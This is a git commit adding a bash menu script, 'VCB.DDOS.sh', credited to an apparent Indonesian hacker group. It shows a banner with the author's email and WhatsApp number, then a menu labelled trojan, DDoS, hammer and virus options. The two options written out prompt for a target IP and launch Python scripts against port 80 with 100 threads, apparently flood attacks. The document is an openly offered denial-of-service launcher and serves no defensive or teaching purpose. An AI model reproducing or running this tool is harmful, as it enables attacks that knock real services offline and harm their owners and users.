8e8b9117f260aab2738d8ea33b62ae4869d64416
Hacketindonedia1 <49530313+Hacketindonedia1@users.noreply.github.com>
2019-06-03 12:48:41 +0700

    New upload

---
+++ VCB.DDOS.sh
@@ -0,0 +1,52 @@
+blue='\033[34;1m'
+green='\033[32;1m'  
+purple='\033[35;1m'
+cyan='\033[36;1m'
+red='\033[31;1m'
+white='\033[37;1m'                                           
+yellow='\033[33;1m'
+clear
+toilet -f slant " DDOS VCB TROJAN " |lolcat
+echo
+echo
+echo $blue"---------------------------------------"
+echo $blue"AUTOUR  :Hacker online / HackerOnline INDONESIA Cyber Army "
+echo $blue"VERSION :1.0"
+echo $blue"JUDUL     :DDOS VCB TROJAN "
+echo $red"---------------------------------------"
+echo $green"?Contact :agunggebang1@gmail.com         "
+echo $green"?WhatsApp:+6289655478810              "
+echo $green"?Message :Jangan Di Record Ya Tod      "
+echo $red"---------------------------------------"
+echo $yellow"                 OMOM"
+echo $red"---------------------------------------"
+echo $white"[1].VCB TROJAN"
+echo $white"[2].VCB DROID"
+echo $white"[3].VCB DDOS"
+echo $white"[4].VCB HAMMER"
+echo $white"[5].VCB VIRUS"
+echo $white"[0].EXIT"
+echo $red"---------------------------------------"
+echo $red"MASUKAN PILIHAN ANDA"
+read -p "PILIH>>==>" bro;
+echo
+if [ $bro = 1 ] || [ $bro = 1 ]
+then
+clear
+toilet -f slant " VCB TROJAN " |lolcat
+echo $red"MASUKAN IP TARGET"
+read -p "===>" ipt
+clear
+echo
+python win.32.64.NT.py -s$ipt -p80 -t100
+fi
+
+if [ $bro = 2 ] || [ $bro = 2 ]
+then
+toilet -f slant " VCB DROID " |lolcat
+echo $red"MASUKAN IP TARGET"
+read -p "===>" ipt
+clear
+echo
+python andromeda.py -s$ipt -p80 -t100
+fi
